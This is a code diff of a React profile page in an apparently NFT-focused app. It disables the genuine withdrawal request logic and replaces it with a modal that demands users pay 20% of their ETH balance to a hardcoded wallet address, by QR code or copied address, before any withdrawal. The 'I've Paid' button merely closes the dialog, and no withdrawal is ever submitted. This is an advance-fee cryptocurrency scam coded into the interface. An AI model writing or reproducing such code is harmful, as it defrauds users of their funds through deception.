@@ -28,11 +28,12 @@ function ProfilePage() {
 
   const [canUpload, setCanUpload] = useState(false); // Set to false to show payment modal
   const [showPaymentModal, setShowPaymentModal] = useState(false); // Add this
-
   const [showWithdrawalModal, setShowWithdrawalModal] = useState(false);
-
   const [isAdmin, setIsAdmin] = useState(false);
 
+  const [withdrawalModal, setWithdrawalModal] = useState(false);
+  // const openWithdrawalModal = ()=>setWithdralModal(true);
+  const closeWithdrawModal = () => setWithdrawalModal(false);
 
   // Add withdrawal form state
   const [withdrawalForm, setWithdrawalForm] = useState({
@@ -54,65 +55,65 @@ function ProfilePage() {
   }, [currentUser]);
 
   const checkAdminRole = async () => {
-  try {
-    const { data, error } = await supabase
-      .from("profiles")
-      .select("admin_role")
-      .eq("id", currentUser.id)
-      .single();
+    try {
+      const { data, error } = await supabase
+        .from("profiles")
+        .select("admin_role")
+        .eq("id", currentUser.id)
+        .single();
 
-    if (error) throw error;
-    setIsAdmin(data?.admin_role || false);
-  } catch (err) {
-    console.error("Error checking admin role:", err);
-    setIsAdmin(false);
-  }
-};
-
+      if (error) throw error;
+      setIsAdmin(data?.admin_role || false);
+    } catch (err) {
+      console.error("Error checking admin role:", err);
+      setIsAdmin(false);
+    }
+  };
 
   // started
   const handleWithdrawalRequest = async (e) => {
     e.preventDefault();
+    setWithdrawalModal(true);
 
-    if (!withdrawalForm.amount || !withdrawalForm.walletAddress) {
-      setError("Please fill in all required fields");
-      return;
-    }
+    // if (!withdrawalForm.amount || !withdrawalForm.walletAddress) {
+    //   setError("Please fill in all required fields");
+    //   return;
+    // }
 
-    const withdrawalAmount = parseFloat(withdrawalForm.amount);
-    const currentBalance = userProfile?.nft_balance || 0;
+    // const withdrawalAmount = parseFloat(withdrawalForm.amount);
+    // const currentBalance = userProfile?.nft_balance || 0;
 
-    if (withdrawalAmount > currentBalance) {
-      setError("Insufficient balance for withdrawal");
-      return;
-    }
+    // if (withdrawalAmount > currentBalance) {
+    //   setError("Insufficient balance for withdrawal");
+    //   return;
+    // }
 
-    try {
-      setLoading(true);
+    // try {
+    //   setLoading(true);
 
-      const { data, error } = await supabase
-        .from("withdrawal_requests")
-        .insert([
-          {
-            user_id: currentUser.id,
-            amount: withdrawalAmount,
-            wallet_address: withdrawalForm.walletAddress,
-            note: withdrawalForm.note,
-            status: "pending",
-            created_at: new Date().toISOString(),
-          },
-        ]);
+    //   const { data, error } = await supabase
+    //     .from("withdrawal_requests")
+    //     .insert([
+    //       {
+    //         user_id: currentUser.id,
+    //         amount: withdrawalAmount,
+    //         wallet_address: withdrawalForm.walletAddress,
+    //         note: withdrawalForm.note,
+    //         status: "pending",
+    //         created_at: new Date().toISOString(),
+    //       },
+    //     ]);
 
-      if (error) throw error;
+    //   if (error) throw error;
 
-      setSuccess("Withdrawal request submitted successfully!");
-      setShowWithdrawalModal(false);
-      setWithdrawalForm({ amount: "", walletAddress: "", note: "" });
-    } catch (err) {
-      setError("Failed to submit withdrawal request.");
-    } finally {
-      setLoading(false);
-    }
+    //   setSuccess("Withdrawal request submitted successfully!");
+    //   setShowWithdrawalModal(false);
+    //   setWithdrawalForm({ amount: "", walletAddress: "", note: "" });
+    // } catch (err) {
+    //   setError("Failed to submit withdrawal request.");
+    // } finally {
+    //   setLoading(false);
+    // }
   };
   // ended
 
@@ -545,20 +546,20 @@ function ProfilePage() {
                   )}
                 </div>
                 <div className="ms-auto mt-3 mt-md-0 d-flex flex-s-column flex-sm-row justify-content-sm-center align-items-sm-center gap-2  settings-buttons">
-                    {isAdmin && (
-    <button
-      className="btn"
-      style={{
-        backgroundColor: "#dc3545",
-        borderColor: "#dc3545",
-        color: "#ffffff",
-      }}
-      onClick={() => window.location.href = '/admin/users'}
-      title="Admin Panel"
-    >
-      <i className="fas fa-user-shield me-2"></i>Admin Panel
-    </button>
-  )}
+                  {isAdmin && (
+                    <button
+                      className="btn"
+                      style={{
+                        backgroundColor: "#dc3545",
+                        borderColor: "#dc3545",
+                        color: "#ffffff",
+                      }}
+                      onClick={() => (window.location.href = "/admin/users")}
+                      title="Admin Panel"
+                    >
+                      <i className="fas fa-user-shield me-2"></i>Admin Panel
+                    </button>
+                  )}
                   <button
                     className="btn " // fs-6 on mobile, fs-5 on sm+
                     style={buttonSecondaryStyles}
@@ -681,7 +682,7 @@ function ProfilePage() {
                       onClick={() => setShowWithdrawalModal(false)}
                     ></button>
                   </div>
-                  <form onSubmit={handleWithdrawalRequest}>
+                  <div>
                     <div className="modal-body">
                       <div className="alert alert-info">
                         <strong>Available Balance:</strong>{" "}
@@ -738,15 +739,19 @@ function ProfilePage() {
                         Cancel
                       </button>
                       <button
-                        type="submit"
+                        type="button"
                         className="btn"
                         style={buttonSuccessStyles}
                         disabled={loading}
+                        onClick={() => {
+                          setWithdrawalModal(true); // Show success modal
+                          setShowWithdrawalModal(false); // Close withdrawal form modal
+                        }}
                       >
                         {loading ? "Processing..." : "Request Withdrawal"}
                       </button>
                     </div>
-                  </form>
+                  </div>
                 </div>
               </div>
             </div>
@@ -1415,33 +1420,125 @@ function ProfilePage() {
           </div>
         </div>
       )}
+      {withdrawalModal && (
+        <div
+          className="modal show d-block"
+          style={{ backgroundColor: "rgba(0,0,0,0.5)" }}
+        >
+          <div className="modal-dialog modal-dialog-centered">
+            <div
+              className="modal-content"
+              style={{
+                border: "none",
+                borderRadius: "12px",
+                boxShadow: "0 10px 25px rgba(0,0,0,0.1)",
+              }}
+            >
+              <div className="modal-header border-bottom-0 pb-0">
+                <h5
+                  className="modal-title fw-bold"
+                  style={{ color: "#2c3e50", fontSize: "1.25rem" }}
+                >
+                  Withdrawal Requirements
+                </h5>
+                <button
+                  type="button"
+                  className="btn-close"
+                  onClick={() => setWithdrawalModal(false)}
+                ></button>
+              </div>
+              <div className="modal-body text-center px-4 py-4">
+                <div className="alert alert-warning bg-soft-warning border-0 mb-4">
+                  <i className="fas fa-exclamation-circle me-2"></i>
+                  Before withdrawal, you need to pay 20% of your ETH balance
+                </div>
+                <h3 className="text-success">
+                  {((userProfile?.nft_balance || 0) * 0.2).toFixed(6)} ETH
+                </h3>
+                <div className="mb-4">
+                  <p className="text-muted mb-3">
+                    Scan this QR code to make payment
+                  </p>
+                  <div className="d-flex justify-content-center mb-3">
+                    <div
+                      className="p-3 bg-white rounded"
+                      style={{
+                        border: "1px solid #eee",
+                        boxShadow: "0 4px 6px rgba(0,0,0,0.05)",
+                      }}
+                    >
+                      <QRCodeSVG
+                        value={`ethereum:0x1f73AEbf099E65B8Af114602f014d0dB628e115F?value=100000000000000000`}
+                        size={180}
+                        level="H"
+                        includeMargin={false}
+                      />
+                    </div>
+                  </div>
 
-      {
-        // handlePayment && (
-        //   <div className="modal show d-block" style={{ backgroundColor: "rgba(0,0,0,0.5)" }}>
-        //     <div className="modal-dialog modal-dialog-centered">
-        //       <div className="modal-content" style={cardStyle}>
-        //         <div className="modal-header border-bottom">
-        //           <h5 className="modal-title fw-bold" style={{ color: "#2c3e50" }}>
-        //             Payment Successful
-        //           </h5>
-        //           <button type="button" className="btn-close" onClick={setClosed(false)}></button>
-        //         </div>
-        //         <div className="modal-body text-center py-4">
-        //           <i className="fas fa-check-circle fa-3x text-success mb-3"></i>
-        //           <h4 style={{ color: "#2c3e50" }}>Thank You!</h4>
-        //           <p className="text-muted mb-4">Your payment was successful. You can now upload NFTs.</p>
-        //         </div>
-        //         <div className="modal-footer border-top">
-        //           <button type="button" className="btn" style={buttonPrimaryStyles} onClick={setClosed(false)}>
-        //             <i className="fas fa-check me-2"></i>Close
-        //           </button>
-        //         </div>
-        //       </div>
-        //     </div>
-        //   </div>
-        // )
-      }
+                  <div
+                    className="input-group mb-3"
+                    style={{ maxWidth: "300px", margin: "0 auto" }}
+                  >
+                    <input
+                      type="text"
+                      className="form-control"
+                      value="0x1f73AEbf099E65B8Af114602f014d0dB628e115F"
+                      readOnly
+                      style={{
+                        borderRight: "0",
+                        backgroundColor: "#f8f9fa",
+                        fontSize: "0.85rem",
+                      }}
+                    />
+                    <button
+                      className="btn btn-outline-secondary"
+                      type="button"
+                      onClick={() => {
+                        navigator.clipboard.writeText(
+                          "0x1f73AEbf099E65B8Af114602f014d0dB628e115F"
+                        );
+                        // You might want to add a toast notification here
+                      }}
+                      style={{
+                        borderTopLeftRadius: "0",
+                        borderBottomLeftRadius: "0",
+                        borderColor: "#dee2e6",
+                      }}
+                    >
+                      <i className="fas fa-copy"></i>
+                    </button>
+                  </div>
+                  <p className="text-muted small">ETH Network Only</p>
+                </div>
+
+                <div className="d-flex justify-content-between align-items-center mt-4 pt-3 border-top">
+                  <button
+                    type="button"
+                    className="btn btn-outline-secondary"
+                    onClick={() => setWithdrawalModal(false)}
+                  >
+                    <i className="fas fa-times me-2"></i>Cancel
+                  </button>
+                  <button
+                    type="button"
+                    className="btn btn-primary"
+                    onClick={() => setWithdrawalModal(false)}
+                    style={{
+                      background: "linear-gradient(135deg, #3a7bd5, #00d2ff)",
+                      border: "none",
+                      padding: "8px 20px",
+                      borderRadius: "8px",
+                    }}
+                  >
+                    <i className="fas fa-check me-2"></i>I've Paid
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* Hidden File Inputs */}
       <input
